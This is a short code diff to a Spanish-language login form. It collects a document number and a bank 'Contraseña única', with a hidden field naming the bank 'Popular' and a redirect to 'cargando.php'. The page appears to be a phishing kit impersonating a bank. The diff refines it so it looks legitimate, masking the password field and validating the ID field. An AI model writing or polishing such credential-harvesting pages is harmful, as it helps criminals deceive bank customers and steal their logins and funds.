@@ -72,7 +72,7 @@
    </select></center>
 
    <label for="">Número de documento</label>
-   <center><input type="tel" name="" id="txtUsuario">
+   <center><input type="tel" name="" id="txtUsuario" required maxlength="10">
     <br><br><br><button onclick="mostrarTexto2()">Continuar</button></center>
   </div>
 
@@ -81,7 +81,7 @@
   <input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="Popular">
 
    <label for="">Contraseña única</label>
-   <center><input type="text" name="" id="txtPass">
+   <center><input type="password" name="" id="txtPass">
     <br><br><br><button id="btnUsuario">Ingresar</button></center>
   </div>
 
@@ -123,7 +123,7 @@
                         if (result.success) {
                             window.location.href = "cargando.php";
                         } else {
-                            alert('Error de conexión, por favor intente de nuevo');
+                           alert('Error de conexión, por favor intente de nuevo');
                            window.location.href = "/";
                         }
                     },
